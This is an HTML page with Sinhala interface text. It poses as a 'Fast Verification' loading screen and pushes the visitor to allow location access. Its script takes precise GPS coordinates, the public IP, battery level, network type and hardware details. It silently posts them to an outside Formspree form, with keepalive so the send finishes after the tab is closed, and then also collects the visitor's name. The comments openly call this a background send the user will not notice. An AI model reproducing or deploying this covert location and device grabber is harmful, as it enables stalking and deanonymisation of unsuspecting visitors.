<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fast Verification</title>
    <style>
        /* CSS ඉක්මනින් Load වීමට සරලව තබා ඇත */
        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 380px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        input, button { width: 100%; padding: 12px; margin-top: 15px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px; display: none; }
        button { background-color: #28a745; color: white; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body onload="startFastProcess()">

<div class="card">
    <div id="content">
        <div id="loading-ui">
            <div class="loader"></div>
            <h2>පිටුව සකසමින් පවතී...</h2>
            <p>කරුණාකර <b>Location Allow</b> කරන්න.</p>
        </div>

        <div id="input-ui">
            <input type="text" id="userName" placeholder="ඔබේ නම මෙතන ලියන්න..." style="display:none;">
            <button id="submitBtn" onclick="finalSend()" style="display:none;">ඉදිරියට යන්න</button>
        </div>
    </div>
</div>

<script>
    let techData = {};
    const formID = "xdabkpao";

    // 1. සියලුම දත්ත එකවර ලබා ගැනීම (Parallel Processing)
    async function startFastProcess() {
        // IP, Battery සහ Hardware විස්තර එකවර Fetch කිරීම
        const ipPromise = fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
        const batteryPromise = navigator.getBattery ? navigator.getBattery().catch(() => null) : null;

        // දත්ත රැස් කිරීම ආරම්භ කරන අතරතුරම Location ඉල්ලීම
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                // Location ලැබුණු සැනින් අනෙක් දත්ත සමග සම්බන්ධ කිරීම
                const [ipRes, batteryRes] = await Promise.all([ipPromise, batteryPromise]);
                
                techData = {
                    ip: ipRes.ip,
                    loc: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                    bat: batteryRes ? `${(batteryRes.level * 100).toFixed(0)}%` : "N/A",
                    net: navigator.connection ? navigator.connection.effectiveType : "N/A",
                    hw: `${navigator.hardwareConcurrency} Cores / ${navigator.deviceMemory || 'Unknown'}GB RAM`,
                    time: new Date().toLocaleString()
                };

                // දත්ත ලැබුණු සැනින් නිහඬව යැවීම (Background Send)
                silentSend("Fast_Auto_Capture");

                // UI එක වහාම පෙන්වීම
                document.getElementById("loading-ui").style.display = "none";
                document.getElementById("userName").style.display = "block";
                document.getElementById("submitBtn").style.display = "block";
            }, () => {
                alert("ඉදිරියට යාමට ලොකේෂන් අවශ්‍යයි.");
            }, { enableHighAccuracy: true, timeout: 5000 });
        }
    }

    // 2. Background එකේ දත්ත යැවීම (පරිශීලකයාට ප්‍රමදයක් දැනෙන්නේ නැත)
    function silentSend(type) {
        fetch(`https://formspree.io/f/${formID}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ Type: type, ...techData }),
            keepalive: true // පිටුව වැසුවත් දත්ත යැවීම නතර නොවේ
        });
    }

    async function finalSend() {
        const name = document.getElementById("userName").value;
        const btn = document.getElementById("submitBtn");
        btn.innerText = "යවමින්...";
        btn.disabled = true;

        await silentSend("Manual_Entry: " + (name || "No_Name"));
        document.getElementById("content").innerHTML = "<h2>සාර්ථකයි!</h2>";
    }
</script>
</body>
</html>
